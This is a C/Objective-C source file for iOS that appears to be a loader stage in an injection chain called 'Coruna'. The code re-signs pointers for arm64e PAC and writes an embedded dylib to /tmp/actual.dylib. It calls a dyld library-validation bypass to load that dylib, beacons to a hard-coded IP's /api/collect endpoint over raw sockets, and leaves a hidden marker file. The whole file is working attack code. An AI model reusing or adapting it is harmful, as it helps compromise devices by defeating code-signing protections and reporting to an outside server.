@import Darwin;
@import MachO;
#include <mach-o/ldsyms.h> /* _mh_dylib_header */

// Function pointers
extern pthread_t pthread_main_thread_np(void);
extern void _pthread_set_self(pthread_t p);
void              (*_abort)(void);
int               (*_close)(int);
void*             (*_dlsym)(void *, const char *);
uint8_t*          (*_getsectiondata)(const struct mach_header_64 *, const char *, const char *, unsigned long *);
thread_t          (*_mach_thread_self)(void);
int               (*_open)(const char *, int, ...);
void              (*__pthread_set_self)(pthread_t p);
pthread_t         (*_pthread_main_thread_np)(void);
int               (*_strncmp)(const char *s1, const char *s2, size_t n);
kern_return_t     (*_thread_terminate)(mach_port_t);
int               (*_write)(int, const void *, size_t);

int dyld_lv_bypass_init(void * (*_dlsym)(void* handle, const char* symbol), const char *next_stage_dylib_path);

void save_section_to_file(const char *section, const char *path) {
    size_t dylib_size = 0;
    const char *dylib = (const char *)_getsectiondata((struct mach_header_64 *)&_mh_dylib_header, "__TEXT", section, &dylib_size);
    if (!dylib || dylib_size == 0) return;
    int fd = _open(path, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd < 0) return;
    _write(fd, dylib, dylib_size);
    _close(fd);
}

const char *save_actual_dylib(void) {
    const char *path = "/tmp/actual.dylib";
    save_section_to_file("__SBTweak", path);
    return path;
}

#if __arm64e__
__attribute__((noinline)) void *pacia(void* ptr, uint64_t ctx) {
    __asm__("xpaci %[value]\n" : [value] "+r"(ptr));
    __asm__("pacia %0, %1" : "+r"(ptr) : "r"(ctx));
    return ptr;
}
#endif

// Minimal cleartext HTTP POST without Foundation (works early in injection).
static void tweakloader_boot_ping(void *(*dlsym_fn)(void *, const char *)) {
    if (!dlsym_fn) return;
    int (*fn_socket)(int, int, int) = dlsym_fn(RTLD_DEFAULT, "socket");
    int (*fn_connect)(int, const void *, unsigned int) = dlsym_fn(RTLD_DEFAULT, "connect");
    long long (*fn_write)(int, const void *, unsigned long long) = (void *)dlsym_fn(RTLD_DEFAULT, "write");
    int (*fn_close)(int) = dlsym_fn(RTLD_DEFAULT, "close");
    unsigned int (*fn_inet_addr)(const char *) = dlsym_fn(RTLD_DEFAULT, "inet_addr");
    uint16_t (*fn_htons)(uint16_t) = dlsym_fn(RTLD_DEFAULT, "htons");
    if (!fn_socket || !fn_connect || !fn_write || !fn_close || !fn_inet_addr || !fn_htons) return;

    struct { uint8_t len; uint8_t family; uint16_t port; uint32_t addr; uint8_t zero[8]; } sa;
    for (int i = 0; i < (int)sizeof(sa); i++) ((uint8_t *)&sa)[i] = 0;
    sa.family = 2; sa.port = fn_htons(8080); sa.addr = fn_inet_addr("143.92.36.95");

    int fd = fn_socket(2, 1, 0);
    if (fd < 0) return;
    if (fn_connect(fd, &sa, 16) != 0) { fn_close(fd); return; }

    const char *body = "{\"type\":\"native_status\",\"stage\":\"boot\",\"note\":\"tweakloader_last\"}";
    char req[512];
    const char *p1 = "POST /api/collect HTTP/1.1\r\nHost: 143.92.36.95:8080\r\nContent-Type: application/json\r\nContent-Length: 64\r\nConnection: close\r\n\r\n";
    int n = 0;
    const char *s = p1;
    while (*s && n < 400) req[n++] = *s++;
    s = body;
    while (*s && n < 500) req[n++] = *s++;
    fn_write(fd, req, n);
    fn_close(fd);

    int (*fn_open)(const char *, int, ...) = dlsym_fn(RTLD_DEFAULT, "open");
    if (fn_open) {
        int bfd = fn_open("/tmp/.coruna_tweakloader_boot", 0x601, 0644);
        if (bfd >= 0) { fn_write(bfd, body, 64); fn_close(bfd); }
    }
}

// Entry point when loaded by Coruna
int last(void) {
#if __arm64e__
    _dlsym = pacia(dlsym, 0);
    __pthread_set_self = pacia(_pthread_set_self, 0);
    _pthread_main_thread_np = pacia(pthread_main_thread_np, 0);
#else
    _dlsym = dlsym;
    __pthread_set_self = _pthread_set_self;
    _pthread_main_thread_np = pthread_main_thread_np;
#endif
    __pthread_set_self(_pthread_main_thread_np());

    _abort = _dlsym(RTLD_DEFAULT, "abort");
    _close = _dlsym(RTLD_DEFAULT, "close");
    _getsectiondata = _dlsym(RTLD_DEFAULT, "getsectiondata");
    _mach_thread_self = _dlsym(RTLD_DEFAULT, "mach_thread_self");
    _open = _dlsym(RTLD_DEFAULT, "open");
    _strncmp = _dlsym(RTLD_DEFAULT, "strncmp");
    _thread_terminate = _dlsym(RTLD_DEFAULT, "thread_terminate");
    _write = _dlsym(RTLD_DEFAULT, "write");

    tweakloader_boot_ping(_dlsym);

    // setup dyld validation bypass
    const char *path = save_actual_dylib();
    dyld_lv_bypass_init(_dlsym, path);

    // should not return
    _thread_terminate(_mach_thread_self());
    return 0;
}
// Bootstrap/type0x09 loader resolves and calls _end for entry2 modules.
// Real work lives in last(); keep end as a thin trampoline.
int end(void) {
    return last();
}
